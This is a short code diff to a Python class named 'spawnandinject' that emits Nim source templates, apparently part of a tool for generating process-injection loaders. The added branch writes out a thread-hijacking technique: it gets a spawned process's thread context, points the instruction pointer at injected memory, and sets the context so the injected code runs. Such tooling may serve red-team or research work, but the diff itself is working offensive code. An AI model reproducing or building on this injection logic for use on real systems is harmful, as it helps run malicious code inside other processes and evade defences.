@@ -94,6 +94,14 @@ class spawnandinject:
             template += """
     discard {NtQueueApcThread}(pi.hThread, address, nil, nil, nil)
 """
+        elif self.args['execute'] == 'SetThreadContext':
+            template += """
+    var ctx: CONTEXT
+    ctx.ContextFlags = CONTEXT_CONTROL
+    discard {GetThreadContext}(pi.hThread, &ctx);
+    ctx.Rip = cast[DWORD64](address)
+    discard {SetThreadContext}(pi.hThread, &ctx)
+"""
 
         if self.args['wait'] == 'WaitForSingleObject':
             template += """
